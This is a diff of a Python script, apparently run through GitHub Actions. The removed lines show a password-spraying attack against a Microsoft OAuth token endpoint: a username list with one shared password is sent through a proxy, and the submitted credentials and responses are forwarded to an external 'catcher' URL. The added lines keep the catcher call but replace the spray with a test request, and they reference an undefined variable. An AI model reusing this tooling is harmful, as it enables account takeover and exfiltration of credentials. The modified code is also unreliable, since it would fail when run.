@@ -2,7 +2,7 @@ import requests
 import os
 from urllib3.exceptions import InsecureRequestWarning
 
-required_env_vars = ["USERNAMES", "PASSWORD", "CATCHERURL", "CATCHERTLS"]
+required_env_vars = ["CATCHERURL", "CATCHERTLS"]
 missing_env_vars = [var for var in required_env_vars if os.getenv(var) is None]
 
 if missing_env_vars:
@@ -11,24 +11,13 @@ if missing_env_vars:
 
 # TODO: add target and other data here later to make this more modular
 # Fetch environment variables
-usernames = os.getenv("USERNAMES").split(',')
-password = os.getenv("PASSWORD")
 catcher_URL = os.getenv("CATCHERURL")
 catcher_uses_TLS_str = os.getenv("CATCHERTLS")
 # Convert catcher_uses_TLS_str to boolean
 catcher_uses_TLS = catcher_uses_TLS_str.lower() == "true"
 
-def send_login_request(username, password):
-    url = "http://18.234.239.10:8888/common/oauth2/token"
-    body_params = {
-        "resource": "https://graph.windows.net",
-        "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
-        "client_info": "1",
-        "grant_type": "password",
-        "username": username,
-        "password": password,
-        "scope": "openid",
-    }
+def send_login_request():
+    url = "https://cloudflare.manfredi.io/test/"
     post_headers = {
         "Accept": "application/json",
         "Content-Type": "application/x-www-form-urlencoded",
@@ -36,10 +25,9 @@ def send_login_request(username, password):
     }
 
     try:
-        response = requests.post(
+        response = requests.get(
             url,
             headers=post_headers,
-            data=body_params,
             proxies={"http": "http://changeme:changeme@127.0.0.1:1234"},
             timeout=5,
         )
@@ -52,7 +40,7 @@ def send_data_to_catcher(data, use_ssl):
     if not use_ssl:
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
     try:
-        response = requests.post(catcher_URL, json=data, timeout=3, verify=use_ssl)
+        response = requests.get(catcher_URL, timeout=3, verify=use_ssl)
         print("[+] Data sent to the catcher.")
     except requests.RequestException:
         print(f"[-] Failed to send data to the catcher.")
@@ -61,19 +49,14 @@ def send_data_to_catcher(data, use_ssl):
 results = []
 
 # Iterate over each username and perform login request
-for username in usernames:
-    login_response_code, login_response = send_login_request(username, password)
-    result = {
-        "username": username,
-        "password": password,
-    }
-    if login_response_code is not None and login_response is not None:
-        result["status_code"] = login_response_code
-        result["response"] = login_response
-    else:
-        result["status_code"] = 500
-        result["response"] = "Github actions workflow failed to perform login request"
-    results.append(result)
+login_response_code, login_response = send_login_request()
+if login_response_code is not None and login_response is not None:
+    result["status_code"] = login_response_code
+    result["response"] = login_response
+else:
+    result["status_code"] = 500
+    result["response"] = "Github actions workflow failed to perform login request"
+results.append(result)
 
 # Send all results to the catcher
 send_data_to_catcher(results, use_ssl=catcher_uses_TLS)
